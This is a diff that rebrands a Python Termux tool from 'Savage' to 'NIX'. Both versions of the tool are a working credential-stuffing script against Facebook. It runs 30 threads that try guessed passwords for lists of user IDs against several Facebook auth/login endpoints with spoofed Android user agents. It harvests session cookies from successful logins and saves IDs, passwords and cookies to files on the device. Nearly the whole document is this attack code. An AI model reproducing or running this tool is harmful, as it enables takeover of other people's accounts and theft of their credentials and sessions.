@@ -1,7 +1,7 @@
-#-------------------------WRITTEN BY MR-Savage--------------
-#-------------------------- Code by MR-ERROR&Savage-----------
+#-------------------------WRITTEN BY MR-NIX--------------
+#-------------------------- Code by MR-ERROR&NIX-----------
 #-------------------Hello World -----------------------------
-#SC MAKED BY Savage
+#SC MAKED BY NIX
 import os
 from os import system as clr
 from os import path
@@ -174,14 +174,14 @@ BM = '\x1b[1;101m' # BELAJANG MERAH
 BA = '\x1b[1;100m' # BELAKANG ABU ABU
 import os
 os.system('git pull')
-os.system('mkdir Savage')
+os.system('mkdir NIX')
 
 import os,zlib
 
 from os import system as osRUB
 from os import system as cmd
 os.system('clear')
-print('         \x1b[38;5;46m WELCOME TO Savage WORLD          ')
+print('         \x1b[38;5;46m WELCOME TO NIX WORLD          ')
 
 
 try:
@@ -228,7 +228,7 @@ except ModuleNotFoundError:
 #sexy()
 from urllib.request import Request, urlopen
 import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
-from concurrent.futures import ThreadPoolExecutor as SiamSavage
+from concurrent.futures import ThreadPoolExecutor as SiamNIX
 from string import * 
 from random import randint
 from time import sleep as slp
@@ -262,15 +262,15 @@ srange = 0
 saved = []
 totaldmp = 0
 filter = []
-os.system("xdg-open https://t.me/")
-sys.stdout.write('\x1b]2;Savage\x07')
+os.system("xdg-open https://t.me/mrnixtermuxtool")
+sys.stdout.write('\x1b]2; Mr:NIX\x07')
 S = '\033[1;37m'
 A = '\x1b[38;5;208m'
 R = '\x1b[38;5;46m'
 F = '\x1b[38;5;48m'
 Z = '\033[1;33m'
 head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
-folder_path = '/sdcard/Savage'
+folder_path = '/sdcard/MR:NIX'
 try:
     os.makedirs(folder_path, exist_ok=True)
 except:
@@ -279,12 +279,15 @@ except:
 oks=[]
 cps=[]
 loop=0
-logo=(f""""          
+logo=(f""""          "Y88P"
+__________________________________________________
+
+ \033[1;92m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;31mAUTHOR:Niloy khan\033[1;92m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
 ──────────────────────────────────────────────────
-\033[1;92m Owner   : Maskatur Islam Mridul
-\033[1;92m Github  : Savage-xd
-\033[1;92m               :
-\033[1;92m Version : 1
+\033[1;92m Owner   :            Niloy khan
+\033[1;92m Facebook:         Niloy Khan
+\033[1;92m Github  :             Niloy khan
+\033[1;92m Version :            1
 ──────────────────────────────────────────────────""")
 #__________________MAIN____________#
 def linex():
@@ -328,7 +331,7 @@ def menu():
     else:
         print('\n Select Wrong option ... ')
         time.sleep(2)
-        Savage(allkey)
+        NIX(allkey)
        # os.system('xdg-open https://wa.me/+8801310067277')
 #---------------------[ USER - AGENT ] -------------------#
 def uaxxx():
@@ -389,7 +392,7 @@ class main_crack():
     def methodA(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mSavage-XD-M1\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
+            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mNIX-XD-M1\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
             sys.stdout.flush()
             android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
             facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
@@ -465,17 +468,17 @@ class main_crack():
 'Content-Length': str(len(content_lenght))}
                 q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Savageb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Savageb};{ckkk}"
-                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mSavage-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NIXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NIXb};{ckkk}"
+                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mNIX-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                     
                     Elite(sid,ps,ckkk)
                     oks.append(sid)                 
-                    open('/sdcard/Savage/OK_ids_M1.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/Savage/COOKiEs_M1.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
+                    open('/sdcard/NIX/OK_ids_M1.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/NIX/COOKiEs_M1.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                     #print(f"\r\x1b[1;96m [Savage-CP] {sid} ● {ps} {S}")
+                     #print(f"\r\x1b[1;96m [NIX-CP] {sid} ● {ps} {S}")
                      cps.append(sid)
-                     open('/sdcard/Savage/M1-CP.txt','a').write(sid+'●'+ps+'\n')
+                     open('/sdcard/NIX/M1-CP.txt','a').write(sid+'●'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -485,7 +488,7 @@ class main_crack():
     def methodC(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mSavage-XD-M3\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
+            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mNIX-XD-M3\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
             sys.stdout.flush()
             android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
             facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
@@ -558,17 +561,17 @@ class main_crack():
 'Content-Length': str(len(content_lenght))}
                 q = session.post("https://api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Savageb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Savageb};{ckkk}"
-                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mSavage-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NIXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NIXb};{ckkk}"
+                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mNIX-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                     
                     Elite(sid,ps,ckkk)
                     oks.append(sid)
-                    open('/sdcard/Savage/OK_ids_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Savage/COOKiEs_M3.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
+                    open('/sdcard/NIX/OK_ids_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/NIX/COOKiEs_M3.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                   # print(f"\r\x1b[1;96m [Savage-CP] {sid} ● {ps} {S}")
+                   # print(f"\r\x1b[1;96m [NIX-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/Savage/M3-CP.txt','a').write(sid+'●'+ps+'\n')
+                    open('/sdcard/NIX/M3-CP.txt','a').write(sid+'●'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -580,7 +583,7 @@ class main_crack():
     def methodB(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mSavage-XD-M2\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
+            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mNIX-XD-M2\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
             sys.stdout.flush()
             android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
             facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
@@ -652,17 +655,17 @@ class main_crack():
 'Content-Length': str(len(content_lenght))}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Savageb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Savageb};{ckkk}"
-                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mSavage-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NIXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NIXb};{ckkk}"
+                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mNIX-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                     
                     Elite(sid,ps,ckkk)
                     oks.append(sid)
-                    open('/sdcard//Savage/OK_ids_M2.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/Savage/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
+                    open('/sdcard//NIX/OK_ids_M2.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/NIX/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    #print(f"\r\x1b[1;96m [Savage-CP] {sid} ● {ps} {S}")
+                    #print(f"\r\x1b[1;96m [NIX-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/Savage/M2-CP.txt','a').write(sid+'●'+ps+'\n')
+                    open('/sdcard/NIX/M2-CP.txt','a').write(sid+'●'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -672,7 +675,7 @@ class main_crack():
     def methodD(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mSavage-XD-M4\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
+            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mNIX-XD-M4\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
             sys.stdout.flush()
             android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
             facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
@@ -744,17 +747,17 @@ class main_crack():
 'Content-Length': str(len(content_lenght))}
                 q = session.post("https://b-api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Savageb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Savageb};{ckkk}"
-                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mSavage-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NIXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NIXb};{ckkk}"
+                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mNIX-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                     
                     Elite(sid,ps,ckkk)
                     oks.append(sid)
-                    open('/sdcard/Savage/OK_ids_M4.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/Savage/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
+                    open('/sdcard/NIX/OK_ids_M4.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/NIX/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
                   #    print(f"\r\x1b[1;96m [Fuck] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard//Savage/M4-CP.txt','a').write(sid+'●'+ps+'\n')
+                    open('/sdcard//NIX/M4-CP.txt','a').write(sid+'●'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -783,7 +786,7 @@ class main_crack():
             current_time = now.strftime("%H:%M:%S")
             print("\x1b[38;5;46mCloneing Start Time \x1b[1;92m●\x1b[38;5;46m ", current_time)
             print("\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-            with SiamSavage(max_workers=30) as Savageworld:
+            with SiamNIX(max_workers=30) as NIXworld:
                 for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
@@ -793,13 +796,13 @@ class main_crack():
                        else:
                             pwx =  pw
                             if 'methodA' in methods:
-                                Savageworld.submit(self.methodA, uid, name, pwx)
+                                NIXworld.submit(self.methodA, uid, name, pwx)
                             elif 'methodB' in methods:
-                                Savageworld.submit(self.methodB, uid, name, pwx)
+                                NIXworld.submit(self.methodB, uid, name, pwx)
                             elif 'methodC' in methods:
-                                Savageworld.submit(self.methodC, uid, name, pwx)
+                                NIXworld.submit(self.methodC, uid, name, pwx)
                             elif 'methodD' in methods:
-                                Savageworld.submit(self.methodD, uid, name, pwx)
+                                NIXworld.submit(self.methodD, uid, name, pwx)
                    except:pass
             result(oks,cps)
 
@@ -889,23 +892,23 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[Savage-OK] '+id+' | '+ps+'\033[0;97m')
+                print('\033[1;32m[NIX-OK] '+uid+' | '+ps+'\033[0;97m')
                 print('\n[‎‎💖]\033[0;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m')
                 linex()
-                open('Savage-OK.txt', 'a').write(id+"|"+ps+"|"+coki)
+                open('NIX-OK.Cookies.txt', 'a').write(uid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:152]
-                print('\033[1;31m[Savage-CP] '+uid+' | '+ps+'\x1b[1;97m')
-                open('Savage-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                print('\033[1;31m[NIX-CP] '+uid+' | '+ps+'\x1b[1;97m')
+                open('NIX-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[1;92m[Savage]\033[1;92m] %s|\33[1;31m[OK]:- %s \r'%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[1;92m[NIX]\033[1;92m] %s|\33[1;31m[OK]:- %s \r'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass 
@@ -914,6 +917,10 @@ def rcrack(uid,pwx,tl):
 ##########
 
 
-with SiamSavage(max_workers=30) as rhu:
+with SiamNIX(max_workers=30) as rhu:
  #   rhu.submit(sexy)
     rhu.submit(menu)
+
+
+
+
